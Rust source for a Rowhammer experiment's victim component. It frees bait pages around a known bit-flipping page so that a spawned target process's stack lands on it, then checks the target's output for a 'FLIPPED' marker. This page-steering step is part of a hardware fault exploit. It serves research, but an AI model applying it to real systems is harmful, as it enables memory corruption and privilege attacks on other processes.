use std::ptr::null_mut;

use anyhow::bail;

use crate::{
    allocator::util::{mmap, munmap},
    util::PAGE_SIZE,
};

use super::HammerVictim;

pub struct StackProcess {
    child: Option<std::process::Child>,
}

/// The injection configuration.
pub struct InjectionConfig {
    /// The flippy page.
    pub flippy_page: *mut libc::c_void,
    /// The flippy page size.
    pub flippy_page_size: usize,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
}

impl StackProcess {
    /// Create a new `StackProcess` victim.
    ///
    /// # Arguments
    /// - `target`: The path to the target binary and args.
    /// - `injection_config`: The injection configuration.
    pub fn new(target: &[String], injection_config: InjectionConfig) -> anyhow::Result<Self> {
        let bait: *mut libc::c_void =
            if injection_config.bait_count_before + injection_config.bait_count_after != 0 {
                mmap(
                    null_mut(),
                    (injection_config.bait_count_before + injection_config.bait_count_after)
                        * PAGE_SIZE,
                )
            } else {
                null_mut()
            };
        let mut cmd = std::process::Command::new(target.first().expect("No target provided"));
        cmd.args(target[1..].to_vec());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        // dealloc
        info!("deallocating bait");

        unsafe {
            if injection_config.bait_count_before != 0 {
                munmap(bait, injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(
                injection_config.flippy_page,
                injection_config.flippy_page_size,
            );
            if injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(injection_config.bait_count_before * PAGE_SIZE),
                    injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        let child = cmd.spawn()?;
        info!("Victim launched");
        // todo: maybe check injection (prime+probe?)
        Ok(Self { child: Some(child) })
    }

    pub fn pid(&self) -> Option<u32> {
        self.child.as_ref().map(|c| c.id())
    }
}

impl HammerVictim<String> for StackProcess {
    fn init(&mut self) {}

    fn check(&mut self) -> anyhow::Result<String> {
        let child = self.child.take();
        match child {
            Some(mut child) => {
                child.kill()?;

                let output = child.wait_with_output()?;
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                info!("Victim stdout: {}", stdout);
                info!("Victim stderr: {}", stderr);
                if stdout.contains("FLIPPED") {
                    Ok(format!("stdout: {}", stdout))
                } else {
                    bail!("stdout: {}", stdout)
                }
            }
            None => bail!("No child process"),
        }
    }

    fn stop(self) {}
}
